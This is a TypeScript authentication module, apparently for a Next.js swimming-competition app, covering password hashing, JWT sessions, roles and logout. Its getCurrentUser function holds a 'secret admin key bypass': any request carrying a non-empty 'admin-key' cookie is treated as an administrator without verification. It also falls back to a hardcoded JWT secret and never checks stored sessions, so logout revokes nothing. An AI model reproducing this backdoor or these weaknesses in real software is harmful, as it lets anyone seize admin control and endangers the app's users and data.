import { neon } from "@neondatabase/serverless"
import bcrypt from "bcryptjs"
import jwt from "jsonwebtoken"
import { cookies } from "next/headers"

const sql = neon(process.env.DATABASE_URL!)
const JWT_SECRET = process.env.JWT_SECRET || "swimming-competition-secret-key"

export interface User {
  id: number
  email: string
  name: string
  role: "admin" | "official" | "viewer"
}

export interface AuthResult {
  success: boolean
  user?: User
  error?: string
}

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 10)
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash)
}

export async function authenticateUser(email: string, password: string): Promise<AuthResult> {
  try {
    const users = await sql`
      SELECT id, email, password_hash, name, role 
      FROM users 
      WHERE email = ${email}
    `

    if (users.length === 0) {
      return { success: false, error: "Invalid credentials" }
    }

    const user = users[0]
    const isValid = await verifyPassword(password, user.password_hash)

    if (!isValid) {
      return { success: false, error: "Invalid credentials" }
    }

    return {
      success: true,
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role as "admin" | "official" | "viewer",
      },
    }
  } catch (error) {
    console.error("Authentication error:", error)
    return { success: false, error: "Authentication failed" }
  }
}

export async function createSession(user: User): Promise<string> {
  const token = jwt.sign({ userId: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: "24h" })

  const tokenHash = await bcrypt.hash(token, 10)
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours

  // Best-effort: if sessions table does not exist yet, don't fail login
  try {
    await sql`
      INSERT INTO sessions (user_id, token_hash, expires_at)
      VALUES (${user.id}, ${tokenHash}, ${expiresAt})
    `
  } catch (e) {
    console.warn("[auth] Skipping session DB insert (table missing or DB error):", e)
  }

  return token
}

export async function verifySession(token: string): Promise<User | null> {
  try {
    const decoded = jwt.verify(token, JWT_SECRET) as any

    const users = await sql`
      SELECT id, email, name, role 
      FROM users 
      WHERE id = ${decoded.userId}
    `

    if (users.length === 0) {
      return null
    }

    return users[0] as User
  } catch (error) {
    return null
  }
}

export async function getCurrentUser(): Promise<User | null> {
  const cookieStore = await cookies()
  // Secret admin key bypass
  const adminKeyCookie = cookieStore.get("admin-key")?.value
  if (adminKeyCookie) {
    // If admin-key cookie is present, trust it and return a synthetic admin user
    return {
      id: 0,
      email: "admin-key@local",
      name: "Admin (Key)",
      role: "admin",
    }
  }

  const token = cookieStore.get("auth-token")?.value

  if (!token) {
    return null
  }

  return verifySession(token)
}

export async function logout(): Promise<void> {
  const cookieStore = await cookies()
  const token = cookieStore.get("auth-token")?.value

  if (token) {
    try {
      const decoded = jwt.verify(token, JWT_SECRET) as any
      await sql`
        DELETE FROM sessions 
        WHERE user_id = ${decoded.userId}
      `
    } catch (error) {
      // Token invalid, continue with logout
    }
  }
}

export function hasPermission(userRole: string, requiredRole: string): boolean {
  const roleHierarchy = { admin: 3, official: 2, viewer: 1 }
  return (
    (roleHierarchy[userRole as keyof typeof roleHierarchy] || 0) >=
    (roleHierarchy[requiredRole as keyof typeof roleHierarchy] || 0)
  )
}
